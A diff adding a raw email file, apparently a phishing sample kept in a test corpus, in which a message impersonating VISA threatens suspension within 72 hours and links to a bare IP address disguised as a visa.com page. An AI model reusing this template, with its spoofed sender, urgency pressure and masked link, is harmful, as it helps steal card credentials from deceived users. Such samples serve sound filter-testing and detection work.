@@ -1,0 +1,66 @@
+From nobody Sun Jan 25 13:50:00 2015
+Return-Path: <security@visa.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id BD0F3469FC
+ for <user@login.example.com>; Thu,  5 Oct 2006 07:30:05 -0400 (EDT)
+Received: from merakmail.tvox.com (merakmail.tvox.com [199.72.150.21])
+ by mail.example.org (Postfix) with ESMTP id B08A86CD046
+ for <user@example.com>; Thu,  5 Oct 2006 07:30:05 -0400 (EDT)
+Received: from User ([203.126.104.109])
+ by merakmail.tvox.com (Merak 7.4.5) with ASMTP id BKT74656;
+ Thu, 05 Oct 2006 06:30:03 -0500
+From: "VISA"<security@visa.com.>
+Subject: Your account is temporarily suspended !
+Date: Thu, 5 Oct 2006 19:35:25 +0800
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20061005113005.B08A86CD046@mail.example.org>
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 382
+
+<html>
+<img src="https://usa.visa.com/img/other/personal/verified_by_visa_grey_box.gif"><br><br>
+<font face="Verdana" size=2>Dear VISA Card Customer,<br><br>
+You have received this email because we have strong reasons to believe
+that your VISA account had been recently compromised. In order to
+prevent any fraudulent activity from occurring we are required to open
+an investigation into this matter.
+<br><br>
+Per the User Agreement, Section 9, we may immediately issue a warning,
+temporarily suspend, indefinitely suspend or terminate your membership
+and refuse to provide our services to you if we believe that your
+actions may cause financial loss or legal liability for you, our users
+or us. We may also take these actions if we are unable to verify or
+authenticate any information you provide to us.
+<br><br>
+If your account information is not updated within the next 72
+hours, then we will assume this account is fraudulent and will be
+suspended. We apologize for this inconvenience, but the purpose of
+this verification is to ensure that your VISA account has not been
+fraudulently used and to combat fraud.
+<br><br>
+Please login into your account at this link, which is a SSL secured
+connection:
+<br><br>
+
+<a href="http://203.123.202.30:84/www.visa.com/globalgateway/visa.html">http://www.visa.com/verified-by-visa/update.htm</a>
+<br><br>
+
+Thank you for your prompt attention to this matter. Please understand that this is a security measure meant to help protect you and your account.  
+<br><br>
+Regards,
+<br>
+Safeharbor Department<br>
+Visa Card, Inc.<br><br>
+</html>
